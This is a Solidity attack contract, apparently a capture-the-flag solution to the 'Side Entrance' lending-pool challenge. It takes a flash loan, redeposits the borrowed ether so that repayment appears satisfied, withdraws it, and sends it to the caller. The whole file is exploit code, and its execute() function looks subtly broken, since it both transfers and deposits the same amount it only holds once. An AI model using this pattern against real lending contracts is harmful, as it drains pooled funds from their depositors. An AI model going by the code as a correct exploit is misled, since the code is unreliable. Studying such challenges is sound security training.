// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../side-entrance/SideEntranceLenderPool.sol";


contract attackside is IFlashLoanEtherReceiver{
SideEntranceLenderPool pool;
uint256 pool_amount;
// bool entered = false;
// event Execute();
constructor(SideEntranceLenderPool _pool,uint256 _pool_amount){
    pool=_pool;
    pool_amount=_pool_amount;
}

function attack()external{
    pool.flashLoan(pool_amount);
    pool.withdraw();
    SafeTransferLib.safeTransferETH(msg.sender, pool_amount);
}
function execute() external payable{
    SafeTransferLib.safeTransferETH(msg.sender, pool_amount);
  pool.deposit{value: pool_amount}();
   
  
    // if (!entered){
    // entered=true;
    // pool.flashLoan(0);
    // }
    //  emit Execute();
}

receive() external payable {}

}